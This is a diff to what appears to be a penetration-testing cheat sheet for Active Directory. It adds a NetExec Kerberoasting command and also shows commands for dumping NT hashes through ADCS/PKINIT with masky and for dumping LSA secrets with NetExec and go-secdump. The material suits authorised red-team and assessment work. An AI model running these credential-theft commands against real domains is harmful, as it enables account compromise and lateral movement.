@@ -816,11 +816,17 @@ u.objectid ENDS WITH "-548" RETURN q
 <details>
   <summary> Domain authentication </summary> 
 
+  ### Kerberoasting
+  ```shell
+  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --kerberoasting <output>.txt
+  ```
+
   ### Dump NT:hash with masky with domain user
   ### Get ADCS server name
   ```shell
   NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
   ```
+
   ### Retrieve the NT hash using PKINIT
   ```shell
   NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
@@ -840,7 +846,7 @@ u.objectid ENDS WITH "-548" RETURN q
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
   ```
-   ### go-secdump Dump LSA with domain user
+  ### go-secdump Dump LSA with domain user
   ```shell
   ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --lsa
   ```
